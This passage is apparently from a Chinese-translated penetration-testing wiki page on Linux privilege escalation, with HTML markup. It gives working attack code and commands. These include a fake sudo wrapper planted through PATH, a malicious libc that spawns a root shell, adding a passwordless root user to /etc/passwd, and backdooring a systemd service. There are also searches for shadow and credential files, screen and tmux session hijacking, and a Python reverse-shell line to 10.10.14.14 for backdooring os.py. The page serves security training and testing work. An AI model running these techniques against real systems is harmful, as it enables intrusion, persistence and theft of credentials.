echo "Defaults !tty_tickets" &gt; /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" &gt;&gt; /etc/sudoers.d/win
</code></pre>
<h3 id="doas"><a class="header" href="#doas">DOAS</a></h3>
<p>有一些替代 <code>sudo</code> 二进制文件的选项，例如 OpenBSD 的 <code>doas</code>，请记得检查其配置文件 <code>/etc/doas.conf</code>。</p>
<pre><code>permit nopass demo as root cmd vim
</code></pre>
<h3 id="sudo-hijacking"><a class="header" href="#sudo-hijacking">Sudo Hijacking</a></h3>
<p>如果你知道一个 <strong>用户通常连接到一台机器并使用 <code>sudo</code></strong> 来提升权限，并且你在该用户上下文中获得了一个 shell，你可以 <strong>创建一个新的 sudo 可执行文件</strong>，该文件将以 root 身份执行你的代码，然后执行用户的命令。然后，<strong>修改用户上下文的 $PATH</strong>（例如在 .bash_profile 中添加新路径），这样当用户执行 sudo 时，你的 sudo 可执行文件就会被执行。</p>
<p>请注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件以添加新路径。例如<a href="https://github.com/APTy/sudo-piggyback"> sudo-piggyback</a> 修改了 <code>~/.bashrc</code>、<code>~/.zshrc</code>、<code>~/.bash_profile</code>。你可以在 <a href="https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py">bashdoor.py</a> 中找到另一个示例。</p>
<p>或者运行类似的命令：</p>
<pre><code class="language-bash">cat &gt;/tmp/sudo &lt;&lt;EOF
#!/bin/bash
/usr/bin/sudo whoami &gt; /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ &gt;&gt; $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
</code></pre>
<h2 id="共享库"><a class="header" href="#共享库">共享库</a></h2>
<h3 id="ldso"><a class="header" href="#ldso">ld.so</a></h3>
<p>文件 <code>/etc/ld.so.conf</code> 指示 <strong>加载的配置文件来自哪里</strong>。通常，这个文件包含以下路径：<code>include /etc/ld.so.conf.d/*.conf</code></p>
<p>这意味着将读取来自 <code>/etc/ld.so.conf.d/*.conf</code> 的配置文件。这些配置文件 <strong>指向其他文件夹</strong>，在这些文件夹中将 <strong>搜索</strong> <strong>库</strong>。例如，<code>/etc/ld.so.conf.d/libc.conf</code> 的内容是 <code>/usr/local/lib</code>。 <strong>这意味着系统将在 <code>/usr/local/lib</code> 内搜索库</strong>。</p>
<p>如果由于某种原因 <strong>用户在任何指示的路径上具有写权限</strong>：<code>/etc/ld.so.conf</code>、<code>/etc/ld.so.conf.d/</code>、<code>/etc/ld.so.conf.d/</code> 内的任何文件或 <code>/etc/ld.so.conf.d/*.conf</code> 内的配置文件中的任何文件夹，他可能能够提升权限。<br />
请查看 <strong>如何利用此错误配置</strong> 的下一页：</p>
<p>{% content-ref url="ld.so.conf-example.md" %}
<a href="ld.so.conf-example.html">ld.so.conf-example.md</a>
{% endcontent-ref %}</p>
<h3 id="rpath"><a class="header" href="#rpath">RPATH</a></h3>
<pre><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =&gt;  (0x0068c000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
</code></pre>
<p>通过将库复制到 <code>/var/tmp/flag15/</code>，它将被程序在此位置使用，如 <code>RPATH</code> 变量所指定。</p>
<pre><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =&gt;  (0x005b0000)
libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
</code></pre>
<p>然后在 <code>/var/tmp</code> 中创建一个恶意库，使用 <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
<pre><code class="language-c">#include&lt;stdlib.h&gt;
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
</code></pre>
<h2 id="capabilities"><a class="header" href="#capabilities">Capabilities</a></h2>
<p>Linux capabilities 提供了一个 <strong>可用根权限的子集给一个进程</strong>。这有效地将根 <strong>权限分解为更小和独特的单元</strong>。每个单元可以独立授予给进程。通过这种方式，完整的权限集被减少，从而降低了被利用的风险。<br />
阅读以下页面以 <strong>了解更多关于能力及其滥用的方法</strong>：</p>
<p>{% content-ref url="linux-capabilities.md" %}
<a href="linux-capabilities.html">linux-capabilities.md</a>
{% endcontent-ref %}</p>
<h2 id="directory-permissions"><a class="header" href="#directory-permissions">Directory permissions</a></h2>
<p>在一个目录中，**“执行”**位意味着受影响的用户可以“<strong>cd</strong>”进入该文件夹。<br />
**“读取”**位意味着用户可以 <strong>列出</strong> <strong>文件</strong>，而 **“写入”**位意味着用户可以 <strong>删除</strong> 和 <strong>创建</strong> 新的 <strong>文件</strong>。</p>
<h2 id="acls"><a class="header" href="#acls">ACLs</a></h2>
<p>访问控制列表 (ACLs) 代表了可选择权限的第二层，能够 <strong>覆盖传统的 ugo/rwx 权限</strong>。这些权限通过允许或拒绝特定用户（非所有者或不属于该组的用户）访问文件或目录，从而增强了对访问的控制。这种 <strong>粒度确保了更精确的访问管理</strong>。更多详细信息可以在 <a href="https://linuxconfig.org/how-to-manage-acls-on-linux"><strong>这里</strong></a> 找到。</p>
<p><strong>给予</strong> 用户 "kali" 对一个文件的读取和写入权限：</p>
<pre><code class="language-bash">setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
</code></pre>
<p><strong>获取</strong>具有特定 ACL 的文件：</p>
<pre><code class="language-bash">getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2&gt;/dev/null
</code></pre>
<h2 id="打开-shell-会话"><a class="header" href="#打开-shell-会话">打开 shell 会话</a></h2>
<p>在 <strong>旧版本</strong> 中，您可以 <strong>劫持</strong> 其他用户 (<strong>root</strong>) 的一些 <strong>shell</strong> 会话。<br />
在 <strong>最新版本</strong> 中，您只能 <strong>连接</strong> 到 <strong>您自己用户</strong> 的屏幕会话。然而，您可能会在会话中找到 <strong>有趣的信息</strong>。</p>
<h3 id="屏幕会话劫持"><a class="header" href="#屏幕会话劫持">屏幕会话劫持</a></h3>
<p><strong>列出屏幕会话</strong></p>
<pre><code class="language-bash">screen -ls
screen -ls &lt;username&gt;/ # Show another user' screen sessions
</code></pre>
<p><img src="../../.gitbook/assets/image%20(141).png" alt="" /></p>
<p><strong>附加到会话</strong></p>
<pre><code class="language-bash">screen -dr &lt;session&gt; #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
</code></pre>
<h2 id="tmux-会话劫持"><a class="header" href="#tmux-会话劫持">tmux 会话劫持</a></h2>
<p>这是一个 <strong>旧版 tmux</strong> 的问题。作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。</p>
<p><strong>列出 tmux 会话</strong></p>
<pre><code class="language-bash">tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
</code></pre>
<p><img src="../../.gitbook/assets/image%20(837).png" alt="" /></p>
<p><strong>附加到会话</strong></p>
<pre><code class="language-bash">tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
</code></pre>
<p>检查 <strong>HTB 的情人节盒子</strong> 以获取示例。</p>
<h2 id="ssh"><a class="header" href="#ssh">SSH</a></h2>
<h3 id="debian-openssl-可预测的-prng---cve-2008-0166"><a class="header" href="#debian-openssl-可预测的-prng---cve-2008-0166">Debian OpenSSL 可预测的 PRNG - CVE-2008-0166</a></h3>
<p>在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（如 Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞的影响。<br />
此漏洞是在这些操作系统中创建新 ssh 密钥时造成的，因为 <strong>仅可能有 32,768 种变体</strong>。这意味着所有可能性都可以计算，并且 <strong>拥有 ssh 公钥后，您可以搜索相应的私钥</strong>。您可以在这里找到计算出的可能性：<a href="https://github.com/g0tmi1k/debian-ssh">https://github.com/g0tmi1k/debian-ssh</a></p>
<h3 id="ssh-有趣的配置值"><a class="header" href="#ssh-有趣的配置值">SSH 有趣的配置值</a></h3>
<ul>
<li><strong>PasswordAuthentication:</strong> 指定是否允许密码认证。默认值为 <code>no</code>。</li>
<li><strong>PubkeyAuthentication:</strong> 指定是否允许公钥认证。默认值为 <code>yes</code>。</li>
<li><strong>PermitEmptyPasswords</strong>: 当允许密码认证时，指定服务器是否允许使用空密码字符串登录账户。默认值为 <code>no</code>。</li>
</ul>
<h3 id="permitrootlogin"><a class="header" href="#permitrootlogin">PermitRootLogin</a></h3>
<p>指定 root 是否可以使用 ssh 登录，默认值为 <code>no</code>。可能的值：</p>
<ul>
<li><code>yes</code>: root 可以使用密码和私钥登录</li>
<li><code>without-password</code> 或 <code>prohibit-password</code>: root 只能使用私钥登录</li>
<li><code>forced-commands-only</code>: root 只能使用私钥登录，并且如果指定了命令选项</li>
<li><code>no</code> : 不允许</li>
</ul>
<h3 id="authorizedkeysfile"><a class="header" href="#authorizedkeysfile">AuthorizedKeysFile</a></h3>
<p>指定包含可用于用户认证的公钥的文件。它可以包含像 <code>%h</code> 这样的标记，这将被主目录替换。<strong>您可以指示绝对路径</strong>（以 <code>/</code> 开头）或 <strong>相对于用户主目录的相对路径</strong>。例如：</p>
<pre><code class="language-bash">AuthorizedKeysFile    .ssh/authorized_keys access
</code></pre>
<p>该配置将指示，如果您尝试使用用户“<strong>testusername</strong>”的<strong>私钥</strong>登录，ssh将比较您的密钥的公钥与位于<code>/home/testusername/.ssh/authorized_keys</code>和<code>/home/testusername/access</code>中的公钥。</p>
<h3 id="forwardagentallowagentforwarding"><a class="header" href="#forwardagentallowagentforwarding">ForwardAgent/AllowAgentForwarding</a></h3>
<p>SSH代理转发允许您<strong>使用本地SSH密钥，而不是将密钥</strong>（没有密码短语！）放在服务器上。因此，您将能够<strong>通过ssh跳转</strong>到一个主机，然后从那里<strong>跳转到另一个</strong>主机，<strong>使用</strong>位于您<strong>初始主机</strong>中的<strong>密钥</strong>。</p>
<p>您需要在<code>$HOME/.ssh.config</code>中设置此选项，如下所示：</p>
<pre><code>Host example.com
ForwardAgent yes
</code></pre>
<p>注意，如果 <code>Host</code> 是 <code>*</code>，每当用户跳转到不同的机器时，该主机将能够访问密钥（这是一种安全问题）。</p>
<p>文件 <code>/etc/ssh_config</code> 可以 <strong>覆盖</strong> 这些 <strong>选项</strong> 并允许或拒绝此配置。<br />
文件 <code>/etc/sshd_config</code> 可以使用关键字 <code>AllowAgentForwarding</code> <strong>允许</strong> 或 <strong>拒绝</strong> ssh-agent 转发（默认是允许）。</p>
<p>如果你发现在某个环境中配置了 Forward Agent，请阅读以下页面，因为 <strong>你可能能够利用它来提升权限</strong>：</p>
<p>{% content-ref url="ssh-forward-agent-exploitation.md" %}
<a href="ssh-forward-agent-exploitation.html">ssh-forward-agent-exploitation.md</a>
{% endcontent-ref %}</p>
<h2 id="有趣的文件"><a class="header" href="#有趣的文件">有趣的文件</a></h2>
<h3 id="配置文件"><a class="header" href="#配置文件">配置文件</a></h3>
<p>文件 <code>/etc/profile</code> 和 <code>/etc/profile.d/</code> 下的文件是 <strong>当用户运行新 shell 时执行的脚本</strong>。因此，如果你可以 <strong>写入或修改其中任何一个，你可以提升权限</strong>。</p>
<pre><code class="language-bash">ls -l /etc/profile /etc/profile.d/
</code></pre>
<p>如果发现任何奇怪的配置文件脚本，您应该检查其中是否包含<strong>敏感信息</strong>。</p>
<h3 id="passwdshadow-文件"><a class="header" href="#passwdshadow-文件">Passwd/Shadow 文件</a></h3>
<p>根据操作系统的不同，<code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件可能使用不同的名称，或者可能存在备份。因此，建议<strong>找到所有这些文件</strong>并<strong>检查您是否可以读取</strong>它们，以查看<strong>文件中是否包含哈希</strong>：</p>
<pre><code class="language-bash">#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2&gt;/dev/null
</code></pre>
<p>在某些情况下，您可以在 <code>/etc/passwd</code>（或等效）文件中找到 <strong>密码哈希</strong>。</p>
<pre><code class="language-bash">grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null
</code></pre>
<h3 id="可写的-etcpasswd"><a class="header" href="#可写的-etcpasswd">可写的 /etc/passwd</a></h3>
<p>首先，使用以下命令之一生成密码。</p>
<pre><code>openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
</code></pre>
<p>然后添加用户 <code>hacker</code> 并添加生成的密码。</p>
<pre><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
</code></pre>
<p>例如: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
<p>您现在可以使用 <code>su</code> 命令与 <code>hacker:hacker</code></p>
<p>或者，您可以使用以下行添加一个没有密码的虚拟用户。<br />
警告：这可能会降低机器的当前安全性。</p>
<pre><code>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd
su - dummy
</code></pre>
<p>注意：在BSD平台上，<code>/etc/passwd</code>位于<code>/etc/pwd.db</code>和<code>/etc/master.passwd</code>，同时<code>/etc/shadow</code>被重命名为<code>/etc/spwd.db</code>。</p>
<p>您应该检查是否可以<strong>写入一些敏感文件</strong>。例如，您能否写入某些<strong>服务配置文件</strong>？</p>
<pre><code class="language-bash">find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2&gt;/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
</code></pre>
<p>例如，如果机器正在运行 <strong>tomcat</strong> 服务器，并且您可以 <strong>修改 /etc/systemd/ 中的 Tomcat 服务配置文件，</strong> 那么您可以修改以下行：</p>
<pre><code>ExecStart=/path/to/backdoor
User=root
Group=root
</code></pre>
<p>您的后门将在下次启动 tomcat 时执行。</p>
<h3 id="检查文件夹"><a class="header" href="#检查文件夹">检查文件夹</a></h3>
<p>以下文件夹可能包含备份或有趣的信息：<strong>/tmp</strong>, <strong>/var/tmp</strong>, <strong>/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root</strong>（您可能无法读取最后一个，但可以尝试）</p>
<pre><code class="language-bash">ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
</code></pre>
<h3 id="奇怪的位置拥有的文件"><a class="header" href="#奇怪的位置拥有的文件">奇怪的位置/拥有的文件</a></h3>
<pre><code class="language-bash">#root owned files in /home folders
find /home -user root 2&gt;/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2&gt;/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2&gt;/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2&gt;/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2&gt;/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2&gt;/dev/null
done
done
</code></pre>
<h3 id="最近修改的文件"><a class="header" href="#最近修改的文件">最近修改的文件</a></h3>
<pre><code class="language-bash">find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2&gt;/dev/null
</code></pre>
<h3 id="sqlite-数据库文件"><a class="header" href="#sqlite-数据库文件">Sqlite 数据库文件</a></h3>
<pre><code class="language-bash">find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2&gt;/dev/null
</code></pre>
<h3 id="_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-文件"><a class="header" href="#_history-sudo_as_admin_successful-profile-bashrc-httpdconf-plan-htpasswd-git-credentials-rhosts-hostsequiv-dockerfile-docker-composeyml-文件">*_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件</a></h3>
<pre><code class="language-bash">find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2&gt;/dev/null
</code></pre>
<h3 id="隐藏文件"><a class="header" href="#隐藏文件">隐藏文件</a></h3>
<pre><code class="language-bash">find / -type f -iname ".*" -ls 2&gt;/dev/null
</code></pre>
<h3 id="脚本二进制文件在-path-中"><a class="header" href="#脚本二进制文件在-path-中"><strong>脚本/二进制文件在 PATH 中</strong></a></h3>
<pre><code class="language-bash">for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2&gt;/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2&gt;/dev/null; done
</code></pre>
<h3 id="网页文件"><a class="header" href="#网页文件"><strong>网页文件</strong></a></h3>
<pre><code class="language-bash">ls -alhR /var/www/ 2&gt;/dev/null
ls -alhR /srv/www/htdocs/ 2&gt;/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2&gt;/dev/null
</code></pre>
<h3 id="备份"><a class="header" href="#备份"><strong>备份</strong></a></h3>
<pre><code class="language-bash">find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2&gt;/dev/null
</code></pre>
<h3 id="已知包含密码的文件"><a class="header" href="#已知包含密码的文件">已知包含密码的文件</a></h3>
<p>阅读<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"><strong>linPEAS</strong></a>的代码，它会搜索<strong>可能包含密码的多个文件</strong>。<br />
<strong>另一个有趣的工具</strong>是：<a href="https://github.com/AlessandroZ/LaZagne"><strong>LaZagne</strong></a>，这是一个开源应用程序，用于检索存储在本地计算机上的大量密码，适用于Windows、Linux和Mac。</p>
<h3 id="日志"><a class="header" href="#日志">日志</a></h3>
<p>如果您可以读取日志，您可能会在其中找到<strong>有趣/机密的信息</strong>。日志越奇怪，可能就越有趣。<br />
此外，一些“<strong>不良</strong>”配置（后门？）的<strong>审计日志</strong>可能允许您<strong>在审计日志中记录密码</strong>，正如在这篇文章中所解释的：<a href="https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/">https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/</a>。</p>
<pre><code class="language-bash">aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&amp;${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2&gt;/dev/null
</code></pre>
<p>为了<strong>读取日志，组</strong> <a href="interesting-groups-linux-pe/#adm-group"><strong>adm</strong></a> 将非常有用。</p>
<h3 id="shell-文件"><a class="header" href="#shell-文件">Shell 文件</a></h3>
<pre><code class="language-bash">~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
</code></pre>
<h3 id="通用凭据搜索正则表达式"><a class="header" href="#通用凭据搜索正则表达式">通用凭据搜索/正则表达式</a></h3>
<p>您还应该检查文件名中或内容中包含“<strong>password</strong>”一词的文件，并检查日志中的IP和电子邮件，或哈希正则表达式。<br />
我不会在这里列出如何做到这一切，但如果您感兴趣，可以查看<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh"><strong>linpeas</strong></a>执行的最后检查。</p>
<h2 id="可写文件"><a class="header" href="#可写文件">可写文件</a></h2>
<h3 id="python库劫持"><a class="header" href="#python库劫持">Python库劫持</a></h3>
<p>如果您知道<strong>从哪里</strong>将要执行python脚本，并且您<strong>可以在</strong>该文件夹中写入或<strong>可以修改python库</strong>，您可以修改OS库并进行后门（如果您可以写入python脚本将要执行的位置，请复制并粘贴os.py库）。</p>
<p>要<strong>对库进行后门</strong>，只需在os.py库的末尾添加以下行（更改IP和端口）：</p>
<pre><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
</code></pre>
<h3 id="logrotate-利用"><a class="header" href="#logrotate-利用">Logrotate 利用</a></h3>
<p><code>logrotate</code> 中的一个漏洞允许对日志文件或其父目录具有 <strong>写权限</strong> 的用户潜在地获得提升的权限。这是因为 <code>logrotate</code> 通常以 <strong>root</strong> 身份运行，可以被操控以执行任意文件，特别是在像 <em><strong>/etc/bash_completion.d/</strong></em> 这样的目录中。检查权限时，不仅要在 <em>/var/log</em> 中检查，还要在应用日志轮换的任何目录中检查。</p>
<p>{% hint style="info" %}
此漏洞影响 <code>logrotate</code> 版本 <code>3.18.0</code> 及更早版本
{% endhint %}</p>
<p>有关该漏洞的更多详细信息，请访问此页面：<a href="https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition">https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition</a>。</p>
<p>您可以使用 <a href="https://github.com/whotwagner/logrotten"><strong>logrotten</strong></a> 利用此漏洞。</p>
<p>此漏洞与 <a href="https://www.cvedetails.com/cve/CVE-2016-1247/"><strong>CVE-2016-1247</strong></a> <strong>（nginx 日志）</strong> 非常相似，因此每当您发现可以更改日志时，请检查谁在管理这些日志，并检查是否可以通过符号链接提升权限。</p>
<h3 id="etcsysconfignetwork-scripts-centosredhat"><a class="header" href="#etcsysconfignetwork-scripts-centosredhat">/etc/sysconfig/network-scripts/ (Centos/Redhat)</a></h3>
<p><strong>漏洞参考：</strong> <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f"><strong>https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</strong></a></p>
<p>如果出于某种原因，用户能够 <strong>写入</strong> 一个 <code>ifcf-&lt;whatever&gt;</code> 脚本到 <em>/etc/sysconfig/network-scripts</em> <strong>或</strong> 能够 <strong>调整</strong> 一个现有的脚本，那么您的 <strong>系统已被攻陷</strong>。</p>
<p>网络脚本，例如 <em>ifcg-eth0</em> 用于网络连接。它们看起来与 .INI 文件完全相同。然而，它们在 Linux 上由网络管理器（dispatcher.d）<del>sourced</del>。</p>
<p>在我的案例中，这些网络脚本中的 <code>NAME=</code> 属性处理不当。如果您在名称中有 <strong>空格</strong>，系统会尝试执行空格后的部分。这意味着 <strong>第一个空格后的所有内容都以 root 身份执行</strong>。</p>
<p>例如： <em>/etc/sysconfig/network-scripts/ifcfg-1337</em></p>
<pre><code class="language-bash">NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
</code></pre>
<h3 id="init-initd-systemd-和-rcd"><a class="header" href="#init-initd-systemd-和-rcd"><strong>init, init.d, systemd 和 rc.d</strong></a></h3>
<p>目录 <code>/etc/init.d</code> 是 <strong>System V init (SysVinit)</strong> 的 <strong>脚本</strong> 的家，<strong>经典的 Linux 服务管理系统</strong>。它包含用于 <code>启动</code>、<code>停止</code>、<code>重启</code>，有时 <code>重新加载</code> 服务的脚本。这些可以直接执行或通过在 <code>/etc/rc?.d/</code> 中找到的符号链接执行。在 Redhat 系统中，另一个路径是 <code>/etc/rc.d/init.d</code>。</p>
<p>另一方面，<code>/etc/init</code> 与 <strong>Upstart</strong> 相关，Upstart 是 Ubuntu 引入的较新 <strong>服务管理</strong>，使用配置文件进行服务管理任务。尽管已经过渡到 Upstart，但由于 Upstart 中的兼容层，SysVinit 脚本仍与 Upstart 配置一起使用。</p>
<p><strong>systemd</strong> 作为现代初始化和服务管理器出现，提供了按需守护进程启动、自动挂载管理和系统状态快照等高级功能。它将文件组织到 <code>/usr/lib/systemd/</code> 用于分发包，和 <code>/etc/systemd/system/</code> 用于管理员修改，简化了系统管理过程。</p>
<h2 id="其他技巧"><a class="header" href="#其他技巧">其他技巧</a></h2>
<h3 id="nfs-权限提升"><a class="header" href="#nfs-权限提升">NFS 权限提升</a></h3>
<p>{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
<a href="nfs-no_root_squash-misconfiguration-pe.html">nfs-no_root_squash-misconfiguration-pe.md</a>
{% endcontent-ref %}</p>
<h3 id="从受限-shell-中逃逸"><a class="header" href="#从受限-shell-中逃逸">从受限 Shell 中逃逸</a></h3>
<p>{% content-ref url="escaping-from-limited-bash.md" %}
<a href="escaping-from-limited-bash.html">escaping-from-limited-bash.md</a>
{% endcontent-ref %}</p>
<h3 id="cisco---vmanage"><a class="header" href="#cisco---vmanage">Cisco - vmanage</a></h3>
<p>{% content-ref url="cisco-vmanage.md" %}
<a href="cisco-vmanage.html">cisco-vmanage.md</a>
{% endcontent-ref %}</p>
<h2 id="内核安全保护"><a class="header" href="#内核安全保护">内核安全保护</a></h2>
<ul>
<li><a href="https://github.com/a13xp0p0v/kconfig-hardened-check">https://github.com/a13xp0p0v/kconfig-hardened-check</a></li>
<li><a href="https://github.com/a13xp0p0v/linux-kernel-defence-map">https://github.com/a13xp0p0v/linux-kernel-defence-map</a></li>
</ul>
<h2 id="更多帮助"><a class="header" href="#更多帮助">更多帮助</a></h2>
<p><a href="https://github.com/ropnop/impacket_static_binaries">静态 impacket 二进制文件</a></p>
<h2 id="linuxunix-权限提升工具"><a class="header" href="#linuxunix-权限提升工具">Linux/Unix 权限提升工具</a></h2>
<h3 id="查找-linux-本地权限提升向量的最佳工具-linpeas"><a class="header" href="#查找-linux-本地权限提升向量的最佳工具-linpeas"><strong>查找 Linux 本地权限提升向量的最佳工具:</strong> <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"><strong>LinPEAS</strong></a></a></h3>
<p><strong>LinEnum</strong>: <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>(-t 选项)<br />
<strong>Enumy</strong>: <a href="https://github.com/luke-goddard/enumy">https://github.com/luke-goddard/enumy</a><br />
<strong>Unix 权限提升检查:</strong> <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br />
<strong>Linux 权限检查器:</strong> <a href="http://www.securitysift.com/download/linuxprivchecker.py">www.securitysift.com/download/linuxprivchecker.py</a><br />
<strong>BeeRoot:</strong> <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">https://github.com/AlessandroZ/BeRoot/tree/master/Linux</a><br />
<strong>Kernelpop:</strong> 枚举 Linux 和 MAC 中的内核漏洞 <a href="https://github.com/spencerdodd/kernelpop">https://github.com/spencerdodd/kernelpop</a><br />
<strong>Mestaploit:</strong> <em><strong>multi/recon/local_exploit_suggester</strong></em><br />
<strong>Linux Exploit Suggester:</strong> <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a><br />
<strong>EvilAbigail (物理访问):</strong> <a href="https://github.com/GDSSecurity/EvilAbigail">https://github.com/GDSSecurity/EvilAbigail</a><br />
<strong>更多脚本的汇编</strong>: <a href="https://github.com/1N3/PrivEsc">https://github.com/1N3/PrivEsc</a></p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>\</li>
